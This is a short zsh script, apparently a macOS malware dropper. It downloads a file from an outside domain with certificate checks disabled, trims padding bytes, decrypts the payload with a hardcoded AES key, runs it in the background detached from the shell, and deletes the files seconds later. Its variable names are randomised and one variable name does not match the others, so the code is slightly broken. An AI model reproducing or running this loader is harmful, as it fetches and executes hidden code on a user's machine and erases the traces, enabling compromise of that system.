#!/bin/zsh
bk2re=$(mktemp /tmp/5bxfyf.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m57414cbb46a8a02b.bin" -o "$bk2rez" || exit 1
tn7vga=$(stat -f %z "$bk2rez"); wr46ya5=$(( tn7vga - 3024 - 1898 ))
tail -c +$(( 3024 + 1 )) "$bk2rez" | head -c $wr46ya5 | openssl enc -d -aes-256-cbc -k 7ca00ef21e1678ac79bfd5a5 -out "$bk2re" 2>/dev/null
[ -s "$bk2re" ] && chmod 700 "$bk2re" && ( "$bk2re" & ) && disown
( sleep 3; rm -f "$bk2re" "$bk2rez" ) &>/dev/null &
